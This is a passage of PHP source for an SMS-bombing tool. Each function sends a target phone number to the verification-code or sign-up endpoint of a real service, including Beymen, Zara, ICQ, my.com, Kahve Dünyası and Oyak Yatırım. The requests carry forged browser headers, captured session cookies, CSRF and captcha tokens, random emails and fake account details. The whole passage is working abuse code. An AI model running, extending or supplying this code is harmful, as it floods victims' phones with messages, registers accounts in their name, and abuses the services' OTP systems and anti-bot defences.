curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"' . $randomEmail . '","mobilePhone":"'. $gsm .'","captchaToken":"03AFcWeA7xw6ownXyEFbLVRA1ltspH9mLRsXO68umP6jmNmz8aOxO2CWHZOLV56LfHqYWSWF69ks-NnHycwAJr6Yi5GGqQCx4MRp8uQuuVZioJZR8tSTDFtCpSBlaE6RzHb3g9FzrDbSGnD7VDQIdFw1UHxyFHHcjZ9VXyFmiL2jeVYsNm-3zBNETwlPpfh8KpmUjn1JpwJJRkOfb2MAI-dV1wm0K5cbToA_KW3QjMMLInJE0NLDOexKobCnfEUIeMA98_CNzhWOE5sHs0kw8zKO-JG2kGKnJvHCJtyczLZLA0-mNU2OFS-sh7UznlPisD-mMS4ckwWitUUbrIFU1vfvVB5VIebbYlxADpc4qnWV5huOQnQOu3WXyzgvZ9Vks-qM6Hhfr71fd_92QPWJa0MVsG_YQ72z_zCF4JWGP6X0od-ey6KQ3mKXUyW7_Xwf9b8iSxxlJwWlmUeJbLbPdNU6sf6GUuAqLEuOIbTxrvCSpHxfBESAsRCMb86ZXwXbOwj0jTfaaS1NOrNDTWNyJUrgDCSmILbsVLwWNxLbVsdgtIUFUS0XjBNgA","isSure":false,"channelCode":"WEB"}');
$response = curl_exec($ch);
curl_close($ch);
}

function kredim($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.kredim.com.tr/api/v1/Communication/SendOTP');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.kredim.com.tr',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/json',
    'origin: https://member.kredim.com.tr',
    'referer: https://member.kredim.com.tr/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"source":"Register","type":8,"gsmNumber":"+90'. $gsm .'","message":"","templateCode":"VerifyMember","originator":"OTP|KREDIM"}');
$response = curl_exec($ch);
curl_close($ch);
}

function toyzzshop($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.toyzzshop.com/uye/mobile-number-change-sms-send?mobile_number=0'. $gsm .'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: tr-TR,tr;q=0.9',
    'Connection: keep-alive',
    'Referer: https://www.toyzzshop.com/uye',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'X-CSRF-TOKEN: dM0ctBFq6mkW0IXStEB6EOjsrHaSMj9C3Hc4JT3o',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'laravel_session=CDJfb3JyIZAk7IWHHuaFxtjY20g4ObckGXDijYJd; last_outputed_email=eyJpdiI6InBmYWxcL0pkOEhQZHArQ0lyUzlmcHZ3PT0iLCJ2YWx1ZSI6IjRWQnQ4aWc0RDd5TDQ2ZE9PU1k3dVFVSWtZUTY0d1B2RjVDQXp5QlV4V0U9IiwibWFjIjoiYmUxNWE1ZWQ4NjRiOGJjNjI3MzMxMjI3ODY5OTI0MzYyNjBhYzE2ZGM5YjEyNTU4YTAxMzQxNTIwMTY3NzM4ZSJ9; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkFickJLY0hKOHBWK3A2QThmRGk0MVE9PSIsInZhbHVlIjoiZG82Y21kZUdRYXpwT0JjZHVOaW9qZDdqQ0hDU3A3U2RPUExjVk5pNERMMjEzWHNsUzJIY1FWdll2Vys5UE1nRjZhRVJoU1JvVUR5VlE1TktIdjdDNUtjU3J6TFF2QXBidnhqMThTUDh5RGc9IiwibWFjIjoiYmQ1ZWJjMzkzMDExODQzYzFjODBjOTQzNjc1ZDlmMTk1ZTAzZTU3NWJhZTVmNjc3MTE3MTdjZTcyNTYzZGY2MSJ9');
$response = curl_exec($ch);
curl_close($ch);
}

function wcollection($gsm){
$randomEmail = generateRandomEmail();    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.wcollection.com.tr/users/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.wcollection.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/json',
    'origin: https://www.wcollection.com.tr',
    'referer: https://www.wcollection.com.tr/users/register/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=PWSgyjoMyfArZMtUhufmUTzPDsYeAqcPxmS9TiiECvn1dKoSHfU8VTZzAjY8ABoI; sessionid=iu56ea8i5dm4gfdaglojia48eykr7ps1');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"first_name":"meth","last_name":"YILMAZ","phone":"0'. $gsm .'","date_of_birth":"1996-02-15","email":"' . $randomEmail . '","password":"Skidlamer123!","gender":"male","email_allowed":"true","sms_allowed":"true","call_allowed":"true","confirm":"true","checkox_contract":"true"}');
$response = curl_exec($ch);
curl_close($ch);
}

function beymen($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.beymen.com/customer/SendOtpMessageForNewCustomerPhoneVerification');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.beymen.com',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/json;charset=UTF-8',
    'origin: https://www.beymen.com',
    'referer: https://www.beymen.com/customer/register?returnUrl=/customer',
    'requestverificationtoken: iDFjPhIn8JK5RRGVzWexmbwqkBGzCvvwRhKeUgn7MtEWSgXO61zQvYmnjE615vpm8JeMx4K7cFTONCEkbfNh1SK2awl5llesjWURwly0mLU1',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'visid_incap_2753670=cqvpNAYvTBikaQj0+ZrXdBKMYmUAAAAAQUIPAAAAAABR7k4Z3SzjTCY0YxRjQqQ/; incap_ses_1193_2753670=A/RNGsRowFWuQF/vSWSOEBKMYmUAAAAAIcSOOFKu4rlP2R4h8w7IYA==; FirstVisitDate=v4t9f5cRZXdcPqHVRgQo4rP5S4JuJptPMLnU6SbgFTM=; UserSessionId=61484b07-cbef-4aa1-b57d-4be15de090bb; nlbi_2753670=3k2pXCO/7nmm9myUJ4guPwAAAADG+diDoZohurP+y4jXDt0b; Entegral.CookieKey.CouponTicket=hYS6rxUtUbEhLz36AoKl23bvTZ7BYbaj/DiO3snjwSM=; nlbi_2753670_2622607=o6/ReLxbfyyrWxUlJ4guPwAAAAA/7DiHVitauMEiMNrnu9B6; __RequestVerificationToken=b3JYpdBWqC6nj7lgauWJ_b1KQGURCdl9dFBZt9aAhmX5FwAPrPJhe6sw4LNULO2agX_TcbnioonDTIllu-KLnuf__wc4CEWCrEw0GZfPoBQ1; Entegral.CookieKey.RelationWithMdm=NoMatch');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"CustomerName":"adasdad sdasdad","EmailAddress":"' . $randomEmail . '","PhoneNumber":"'. $gsm .'"}');
$response = curl_exec($ch);
curl_close($ch);
}

function kahvedunyasi($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://core.kahvedunyasi.com/api/users/sms/send');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: tr-TR,tr;q=0.9',
    'Connection: keep-alive',
    'Content-Type: application/json;charset=UTF-8',
    'Guest-Token: oWd1OiMcjHnAIoN1BZoN57vEG6PeI4XkJ2lSTmPN',
    'Origin: https://www.kahvedunyasi.com',
    'Positive-Client: kahvedunyasi',
    'Positive-Client-Type: web',
    'Referer: https://www.kahvedunyasi.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'page-url: /kayit-ol',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'store-id: 1',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile_number":"'. $gsm .'","token_type":"register_token"}');
$response = curl_exec($ch);
curl_close($ch);
}

function oyakyatirim($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://hesap.oyakyatirim.com.tr/api/phone');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json',
    'Accept-Language: tr-TR,tr;q=0.7',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Origin: https://hesap.oyakyatirim.com.tr',
    'Referer: https://hesap.oyakyatirim.com.tr/register',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'ADRUM=s=1700938257579&r=https%3A%2F%2Fsube.oyakyatirim.com.tr%2Ftr%2FAccount%2FOperation%2FRememberPassword%3F0; session=Fe26.2*1*b86f3258b1cd2f7a988615ce8e7d7804f8138331d30639b3960081215ef30937*UVdSMCA6UArjfCzqB-rI3A*lKtUczWQfwE0_VXieQMe2fqjvqjSzhGpiaXyATId6eTcSkIF4nbNARIi80cTtPyEatnSZSlfh2A_IyNZhbrBLIOgHzk8xPeyiJPt1F32Y4OdaqytL4q8yoU0a7w02hwnk_YqDjtTV1WBawgYSpWKxv2ntcvcv8ND1Ay68LVUU9eGsctf4OvSIX69F5TzpV5kl3bL4CCA3Xf4Xhi97Yy97g*1702253668212*cfc19f6f23e1d58c45f70548556fbb1087175197e49bb9005ff0d7fae1375b7d*5HO5faYRdEw-7dNBj4rjSZKKjkaZtE9OWlfdeqMgx-4~2; TS01d41841=015cb5a211e903f2e4d789a29ba406e1fcf7d39c8bdcda3ad2d2a6d2768b32f1f8018d61f40fc6926658bea4cce906fec3b13fa1b3794632aec0d57ef4584b2f42765072d9');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nationalId":"11623927056","cellPhone":"'. $gsm .'","KVKKApproval":true}');
$response = curl_exec($ch);
curl_close($ch);
}

function uysalmarket($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: tr-TR,tr;q=0.9',
    'Connection: keep-alive',
    'Content-Type: application/json;charset=UTF-8',
    'Origin: https://uysalmarket.com.tr',
    'Referer: https://uysalmarket.com.tr/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone_number":"'. $gsm .'"}');
$response = curl_exec($ch);
curl_close($ch);
}

function espressolab($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.espressolab.com/shop/Register.aspx/RegisterUser');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.espressolab.com',
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: tr-TR,tr;q=0.7',
    'content-type: application/json; charset=UTF-8',
    'origin: https://www.espressolab.com',
    'referer: https://www.espressolab.com/shop/uye-ol/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'ASP.NET_SessionId=vslx035czukc42vbhtu0fzi1; WebSession=92115FB5-01C0-4622-B9CF-ADF1E4594D2C');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"GenderId":"E","IsAccept":"true","IsRead":"true","birthdate":"09/06/1990","campaingpermission":"1","confirmpassword":"Skidlamer1","email":"' . $randomEmail . '","namesurname":"muhammet ekmek","password":"Skidlamer1","phonenumber":"90'. $gsm .'"}');
$response = curl_exec($ch);
curl_close($ch);
}

function total($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://apimobile.guzelenerji.com.tr/exapi/profile');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: apimobile.guzelenerji.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.5',
    'content-type: application/json',
    'origin: https://club.guzelenerji.com.tr',
    'referer: https://club.guzelenerji.com.tr/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"first_name":"Asdasdasd","last_name":"Asdasdasd","date_of_birth":"1987-11-13T00:00:00-03:00","gender":"male","email":"' . $randomEmail . '","phone":"0'. $gsm .'","city":"ADIYAMAN","member_type":2,"member_type_name":"Standart","reference_type":6,"reference_type_name":"Web","plate_number":"78AD421","county":"GERGER","sms_allowed":true,"email_allowed":true,"push_allowed":true,"membership_agreement":true,"call_allowed":true,"kvkk":true,"cookie_allowed":true,"last_online_time":"2023-11-26T03:29:53-03:00","created_at":"2023-11-26T03:29:53-03:00","updated_at":"2023-11-26T03:29:53-03:00"}');
$response = curl_exec($ch);
curl_close($ch);
}

function icq($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://u.icq.net/api/v92/rapi/auth/sendCode');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: u.icq.net',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/json',
    'origin: https://web.icq.com',
    'referer: https://web.icq.com/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"reqId":"6548-1700995835","params":{"phone":"90'. $gsm .'","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}');
$response = curl_exec($ch);
curl_close($ch);
}

function my($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://account.my.com/signup_send_sms/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: */*',
    'Accept-Language: tr-TR,tr;q=0.8',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://account.my.com',
    'Referer: https://account.my.com/tr/signup/?continue=https%3A%2F%2Faccount.my.com%2Ftr%2Fprofile%2Fuserinfo%2F',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrf_token=fsxDtgphXjBOFFYYzawfwD; s=rt=1|dpr=1.25; mr1lad=656334074f3ad9fc-300-300-');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'phone=90'. $gsm .'&csrf_token=fsxDtgphXjBOFFYYzawfwD');
$response = curl_exec($ch);
curl_close($ch);
}

function zara($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.zara.com/tr/tr/phone/init-verification?ajax=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.zara.com',
    'accept: application/json',
    'accept-language: tr-TR,tr;q=0.5',
    'content-type: application/json',
    'origin: https://www.zara.com',
    'referer: https://www.zara.com/tr/tr/signup',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'ITXSESSIONID=c26e335ae6f4ec69cbe9a2b6eca1bbf0; ITXDEVICEID=5b7d609fddcefa2eca9c2b19d37b5df3; bm_sz=C8D07E208A03F679746A97B627B424D2~YAAQrLOvw5SGpc+LAQAA+F6FCxVpELS3KQ6B5N0KCHyGokZ8JnI/jXYcK6KU7pkM77IuTcoEmE8YwYuOwYgit/mW3T712p569TNHbknG8TaVhRE4DL/cfDx/VAyhQl/sodYIbBYZBJaPGc1bCUIawjizjG9D/yZrTeJxGb3a3uDpjnQkw8VQKtrGEAcdLE7/DgYSeA1ql/Y+qDABylBurZxLoGChb5GyIJZTpFswiR+iGJ9C1MeWcvmytjMwSirikJEaEOKadLQWR8BWzRxpOMya08lF7JDg4Nxksk5C8Woe~3159617~3486264; ak_bmsc=1C703D0136B2893249435D72A555F4D1~000000000000000000000000000000~YAAQrLOvw5+Gpc+LAQAADWGFCxVhnLV5XaVy+DtFmfx/DJIrDisqYVzFP131mvwrFVTiB6p+6uOANGs0Xc3xsfaqkT/dhQXpGNHYIVcKmK9eMk8AJ6luwN8em+Oxq+RzT5oig8Ja8ke8z/xNK7vGblTvhZ6haWJUPhsH6bg1Pq1isGOOlrSzFb23NnR/mHpNyaTel9jcxc4kBBCn4ZANmT/g7ObIXk+waT5M/p08vD3DiCgQPmMgkd0G8jojA+3sYyJNoiBsQHim7nqhsFUhHOuzf25p0i34AByCgM1CTQ1HoZ7Jb6uE8I3oYKMJoI4MmVuNtwgLIV+/C1WguZbnFI5cNOn0l8wKjV6ap4tUmzWpAFfDZdFuV0xTjlAf4wkXmQhjwsvqyam9H+VLOAq0RBpZ52nbZFqfohqemWo+kb4NBfgtOa6mXGr5eY3ypxGaqt+kGswvmJGe; _itxo11y_ses.01fa=*; rid=63da3eb3-5e87-442a-ac65-e040fb6e888f; dc4ccbb598096c739c4b271779aa1331=10e393f5b9c5209eccd7b9a0fa4ab2c2; cart-was-updated-in-standard=true; storepath=tr%2Ftr; bm_mi=0C74A83B6190CA635E81B06C65B1A011~YAAQrLOvw2mHpc+LAQAAKaaFCxUiCyRDgJG3y7ofGBfYXeCBK2McWenwSsDrRfCz5f2OJY8AE9wHoI8AtZNJzvalK+uN8q+0C9dEHK+JO/fcZ4G/kONr0nstGSLkQ4jLPPIz7dWm6edJznclFTjlcdGLi9diiHM/pdIGCylMIy0Y+9yd6lw/LihjvCwSE2kkRgLcj3YzmmkHaxeKo9/U0dqXyJEFeVX9gREskQ1lrEfuU3G3jeBR+DdOiSJtWRqsH77X9jj3RBkSojQn54fHI9ewdoCpaKFKvyRywlxHjCBMjurYB9B1Y90+iAuFUA==~1; _itxo11y_id.01fa=cc3c9de6-48b6-4db2-8b54-bfa0a6d9ddc5.1701000342.1.1701000358..009cfca0-3701-4020-b848-1af4f8d19619....0; storepath=tr%2Ftr; _abck=83CE89DCB5E0910E8770C4FB0FB57C77~0~YAAQrLOvw6+Hpc+LAQAAeceFCwpOgO/5Uz4G2Tongl65Xtbb0mO6cEWNcOvpotAmGW0AI7trDWlO+069RVUNRVBXDjTxODfFObaoz+N5zUGNu0k4ypElQpaypJLXWppPkIqLARQsgzvR/3y67rQYalX2Eo3rBhKl/N+bIjyWpl1/AUCT1UJdiHZ3A+noW+XY1X0+3GzaGol5/zg3Ei1rOmtyM1F+hOX/mNxvOe8SxYZ3pei4JqpPXalOeWPMn2ZllYIdoks2YAchS+J27Rxw/fwdiMqp1hYiXZF+bZFRpSehvYlwrzP22t0+7iksnE5HcO+PTsE2pHHIdqIGjPsz7HVQgBG3x4j3Kk15AMEKzne0lILFdb3kcbTQGfqnluWwftYojnugoK0pUllQLojz4iq7xTvF2Q==~-1~-1~-1; n_user=s%3Aj%3A%7B%22userId%22%3A2001732939032%2C%22userToken%22%3A%22KSbGwjyZ8h4OkTVQ16r1xaF9kVOXYU8JggoryafnB7E%3D%22%2C%22WCToken%22%3A%22Bearer%3AG%3ALHwxGkaWApvz9OHPwyvfiS_lUlf-e8K2aV_rFwnQVLuPr-N100GbXr3Yra0Nb0Dfceirh6K6YiOkaprteruSuqTplJ7k3DAQRpKytAM3-4wNrFhvEnKFbFDVA_-MDaL4%22%2C%22kind%22%3A%22guest%22%2C%22storeId%22%3A11766%7D.%2FqDRmUVWpEglcQt1VauAL6hUOdnXUBud%2BW0FyLq3wv8; n_suser=s%3Aj%3A%7B%22userId%22%3A2001732939032%2C%22userToken%22%3A%22KSbGwjyZ8h4OkTVQ16r1xaF9kVOXYU8JggoryafnB7E%3D%22%2C%22WCTrustedToken%22%3A%22Bearer%3AG%3ALHwxGkaWApvz9OHPwyvfiS_lUlf-e8K2aV_rFwnQVLuPr-N100GbXr3Yra0Nb0Dfceirh6K6YiOkaprteruSuqTplJ7k3DAQRpKytAM3-4wNrFhvEnKFbFDVA_-MDaL4%22%7D.s0%2FG0eN%2FuuIM%2F2B%2BRdSrmzi43cRNg3AbQiAv00Jwhi8; userType=guest; migrated=true; sids=s%3AxeUUXavfi12qAJ4_qQHAiaPpBTRpQBCd.nAm1tDGoGWcuvQcRnirYlKdKx%2F8AsxLGUDthq%2FXIGZ0; TS0122c9b6=019ceafdc372919325fa2ea82e8ab03148953d3b9061fd07d46e406d763cb03a38f1f04e9bdf5b4dff8ddf86b6df636afaef5d5296; IDROSTA=35ea88abdb7a:2209aed64c99db90e88793c64; bm_sv=3A164F8978347C14BFB680A2BD56EE90~YAAQrLOvw7uHpc+LAQAAXNOFCxUuS3b7GAYl5zIcM5iiW8KErskeX+jHEdHp1Q43YQ6zeGvMVhekuBuNrpqPUOs4HqOmHKNpk/RwKrU+0q8UR0OVyZrm1hzFcuxwcT87WXHzG+2irOPGmkF920kzNY4zNJpOW3sIN19MLzGEKUGeRXCA9beEgMi2uSS9SWVgjt2sgsc7Gy5BG6cIBvIt1bo7/JZb6J4sAk06IhXk1dGTGjNSFjX90z887wJak0w=~1');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"' . $randomEmail . '","password":"Skidlamer123!","firstName":"ahmet","lastName":"elmas","phone":{"prefix":"+90","number":"'. $gsm .'","countryCode":"TR"},"advise":"","newsletterCheck":true,"privacyCheck":true,"addressType":"billing","city":"-","privacyPolicyBundle":{"newsletter":true},"isAdvertisingCookiesAllowed":false,"ch_token":"4gzi4gzi4gzi4gziVTt8VTt8VTt8VTt8"}');
$response = curl_exec($ch);
curl_close($ch);
}

function money($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.money.com.tr/Register/ValidateAndSendOTP');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: */*',
    'Accept-Language: tr-TR,tr;q=0.5',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://www.money.com.tr',
    'Referer: https://www.money.com.tr/uye-ol',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
